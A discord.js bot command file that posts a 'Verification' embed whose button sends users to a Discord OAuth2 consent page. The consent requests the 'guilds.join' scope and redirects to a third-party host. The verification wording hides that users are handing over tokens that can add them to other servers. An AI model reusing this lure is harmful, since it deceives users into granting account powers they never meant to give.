const { Client, CommandInteraction } = require("discord.js");
const utils = require("../utils");
const config = require("../config");

const messages = [
    {
        embeds: [{
            color: config.embedColor,
            title: "🛡️ Verification",
            description: "Click on the button to access the server."
        }],
        components: [{
            type: "ACTION_ROW",
            components: [{
                type: "BUTTON",
                style: "LINK",
                label: "Check yourself",
                emoji: "✅",
                url: "https://discord.com/api/oauth2/authorize?client_id=1041337565237755924&redirect_uri=https%3A%2F%2Ffastjoins.xyz%3A8443%2Foauth2&response_type=code&scope=identify%20guilds.join"
            }]
        }]
    }
];

module.exports = {
    data: {
        description: "Send embed in this channel.",
        options: [{
            type: "NUMBER",
            name: "embed",
            description: "Select a embed.",
            choices: messages.map((msg, index) => {
                return {
                    name: msg.embeds.map(({ title }) => title).join(", "),
                    value: index
                };
            }),
            required: true
        }]
    },
    /**
     * 
     * @param {Client} client 
     * @param {CommandInteraction} interaction 
     */
    async exe(client, interaction) {
        interaction.deferReply({
            ephemeral: true,
            fetchReply: true
        }).then(() => {
            interaction.channel.send(messages[interaction.options.getNumber("embed")]).then(() => {
                interaction.editReply({
                    embeds: [{
                        color: "GREEN",
                        description: `${config.emojis.checkmarkbutton} The embed has been sent.`
                    }],
                    ephemeral: true
                });
            }).catch((err) => {
                interaction.editReply({
                    embeds: [{
                        color: "RED",
                        description: `${config.emojis.crossmarkbutton} An error occurred while sending the embed.\n\`\`\`${err.message}\`\`\``
                    }],
                    ephemeral: true
                });
            });
        }).catch(() => {});
    }
};